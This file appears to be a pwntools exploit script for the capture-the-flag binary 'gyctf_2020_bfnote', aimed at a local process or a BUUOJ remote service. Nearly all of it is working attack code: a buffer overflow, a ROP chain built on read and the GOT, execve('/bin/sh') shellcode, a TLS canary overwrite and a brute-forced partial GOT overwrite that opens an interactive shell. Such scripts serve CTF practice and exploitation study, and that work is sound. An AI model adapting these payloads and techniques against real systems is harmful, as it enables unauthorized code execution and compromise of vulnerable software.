import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='i386'
while True :
      # try :
            if len(sys.argv)==1 :
                  # io=process('./gyctf_2020_bfnote')
                  io=process(['./gyctf_2020_bfnote'],env={'LD_PRELOAD':'../../i386libc/x86_libc.so.6'})
                  elf=ELF('./gyctf_2020_bfnote')
                  libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
                  one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
            else :
                  io=remote('node3.buuoj.cn',25170)
                  elf=ELF('./gyctf_2020_bfnote')
                  libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
                  one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


            

            guess = 0xe160
            postscript = 0x804A060
            got_read = 0x804A010
            plt_read = 0x8048470
            pop_esi_edi_ebp_ret = 0x80489d9

            payload = 'A'*0x32
            payload += 'B'*4+p32(0)+p32(postscript+4)

            io.sendafter('description : ',payload)

            context.arch = 'i386'
            payload2 = flat(plt_read,pop_esi_edi_ebp_ret,0,p32(got_read),2)
            payload2 += flat(plt_read,postscript+0x50,0x804A000,0x1000,7)
            payload2 = payload2.ljust(0x50,'\x00')
            payload2 += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"

            io.sendafter('postscript : ',payload2)

            asize = 0x20000
            io.sendafter('notebook size : ',str(asize))
#change canary
            io.sendafter('title size : ',str(0x22000-0x8ec-0x18))

            io.sendafter('re-enter :',str(8))
            io.sendafter('title : ','1'*8)
            io.sendafter('note : ','B'*8)
            io.recvuntil('B'*8)

            io.send(p16(guess))
            
            


            # libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
            # libc.address=libc_base
            # system_addr=libc.sym['system']
            # bin_sh_addr=libc.search('/bin/sh\x00').next()
            # success('libc_base:'+hex(libc_base))
            io.interactive()

      # except Exception as e:
      #     io.close()
      #     continue
      # else:
      #     continue